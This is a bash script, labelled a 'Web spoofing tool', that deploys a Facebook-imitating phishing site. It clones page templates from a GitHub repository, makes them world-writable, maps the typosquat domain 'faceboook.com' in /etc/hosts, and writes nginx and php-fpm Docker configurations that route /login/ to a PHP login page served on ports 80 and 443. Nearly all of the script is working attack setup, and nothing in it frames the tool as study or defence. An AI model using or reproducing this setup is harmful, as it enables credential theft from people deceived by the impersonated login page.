#!/bin/bash
#############################################
#                                           #
#           Web spoofing tool               #
#                                           #
#############################################

PHP_CONTAINER="php-web-spoofing"
NGX_CONTAINER="nginx-web-spoofing"

mkdir -p /var/containers/$NGX_CONTAINER/etc/nginx/vhosts
mkdir -p /var/containers/share/var/www/sites

git clone https://github.com/kevop-s/Web-spoofing /tmp/Web-spoofing
cp -r /tmp/Web-spoofing/html/* /var/containers/share/var/www/sites
rm -rf /tmp/Web-spoofing
chmod 757 /var/containers/share/var/www/sites/*

echo "127.0.0.1 faceboook.com" >> /etc/hosts

cat<<-EOF > /var/containers/$NGX_CONTAINER/etc/nginx/nginx.conf
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log warn;
pid        /var/run/nginx.pid;


events {
    worker_connections  102400;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    server_tokens off;

    log_format  main  '\$remote_addr - \$remote_user [\$time_local] "\$request" '
                      '\$status \$body_bytes_sent "\$http_referer" '
                      '"\$http_user_agent" "\$http_x_forwarded_for"';

    log_format  main_t  '\$remote_addr - \$remote_user [\$time_local] "\$request" '
                        '\$status $body_bytes_sent "\$http_referer" '
                        '"\$http_user_agent" "\$http_x_forwarded_for"'
                        ' \$upstream_cache_status "\$request_time" "\$upstream_response_time" "\$upstream_header_time"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    tcp_nopush      on;
    tcp_nodelay     on;

    server_names_hash_bucket_size   128;
    # Start: Size Limits & Buffer Overflows #
    client_body_buffer_size         1K;
    client_header_buffer_size       1k;
    client_max_body_size            64k;
    large_client_header_buffers     16 16k;
    # END: Size Limits & Buffer Overflows #

    # Default timeouts
    keepalive_timeout            5s;
    client_body_timeout         10s;
    client_header_timeout       10s;
    send_timeout                20s;
    fastcgi_connect_timeout    300s;
    fastcgi_send_timeout        30s;
    fastcgi_read_timeout        60s;
    #
    reset_timedout_connection   on;

    gzip  on;
    gzip_disable "msie6";
    gzip_http_version 1.1;
    gzip_buffers 32 8k;
    gzip_min_length  1000;
    gzip_types  text/plain   
            text/css
            text/javascript
            text/xml
            text/x-component
            application/javascript
            application/json
            application/xml
            application/rss+xml
            font/truetype
            font/opentype
            application/vnd.ms-fontobject
            image/svg+xml
            image/png
            image/gif
            image/jpeg
            image/jpg;


    include /etc/nginx/conf.d/*.conf;
    include /etc/nginx/vhosts/*.conf;
}
EOF

cat<<-EOF > /var/containers/$NGX_CONTAINER/etc/nginx/vhosts/facebook.com.conf
server {
    listen 80;
    index index.php index.html;
    server_name faceboook.com;
    root /var/www/sites/\$host;

    location ~ \.php\$ {
        try_files \$uri /index.html =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)\$;
        fastcgi_pass php-fpm:9000;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME /var/www/sites/\$host\$fastcgi_script_name;
        fastcgi_param PATH_INFO \$fastcgi_path_info;
    }

    location /login/ {
        return 307 http://\$host/login.php;
    }

    location / {
        try_files \$uri /index.html =404;
    }
}
EOF

docker run -d --name $PHP_CONTAINER \
    -v /var/containers/share/var/www/sites:/var/www/sites:z \
    -v /etc/localtime:/etc/localtime:ro \
    php:7-fpm

docker run -td --name $NGX_CONTAINER \
    -p 80:80 -p 443:443 \
    -v /var/containers/share/var/www/sites:/var/www/sites:z \
    -v /var/containers/$NGX_CONTAINER/var/log/nginx:/var/log/nginx:z \
    -v /var/containers/$NGX_CONTAINER/etc/nginx/vhosts:/etc/nginx/vhosts:z \
    -v /var/containers/$NGX_CONTAINER/etc/nginx/nginx.conf:/etc/nginx/nginx.conf:z \
    -v /etc/localtime:/etc/localtime:ro \
    -h $NGX_CONTAINER.service \
    --link $PHP_CONTAINER:php-fpm \
    nginx